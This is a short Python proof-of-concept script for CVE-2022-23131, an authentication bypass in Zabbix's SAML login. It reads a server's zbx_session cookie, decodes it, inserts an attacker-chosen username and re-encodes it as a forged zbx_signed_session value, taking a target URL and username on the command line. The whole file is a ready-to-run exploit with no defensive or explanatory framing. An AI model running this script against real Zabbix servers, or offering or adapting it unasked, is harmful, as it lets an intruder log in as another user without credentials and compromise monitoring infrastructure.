import requests
import re
import urllib.parse
import base64
import json
import argparse
from loguru import logger


def exp(target, username):
    
    resp = requests.get(url=target, verify=False)
    cookie = resp.headers.get("Set-Cookie")
    
    # get the session cookie
    zbx_session = re.findall(r"zbx_session=(.*?); ", cookie)

    url_decode_data = urllib.parse.unquote(zbx_session[0], encoding='utf-8')
    base64_decode_data = base64.b64decode(url_decode_data)

    decode_to_str = str(base64_decode_data, encoding='utf-8')

    to_json = json.loads(decode_to_str)

    # re-format as json
    json_data = dict(saml_data=dict(username_attribute=username), sessionid=to_json["sessionid"], sign=to_json["sign"])

    logger.info("Target was vulnerable.")

    json_payload = json.dumps(json_data)
    logger.info("zbx_signed_session(json format): {}".format(json_payload))

    payload = urllib.parse.quote(base64.b64encode(json_payload.encode()))
    logger.info("zbx_signed_session: {}".format(payload))


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Poc of CVE-2022-23131.")

    check_group = parser.add_argument_group("check")
    check_group.add_argument("-t", "--target", type=str, required=True, help="Target url.")
    check_group.add_argument("-u", "--username", type=str, required=True, help="Username of zabbix you have.")

    args = parser.parse_args()

    target = args.target
    username = args.username


    exp(args.target, args.username)
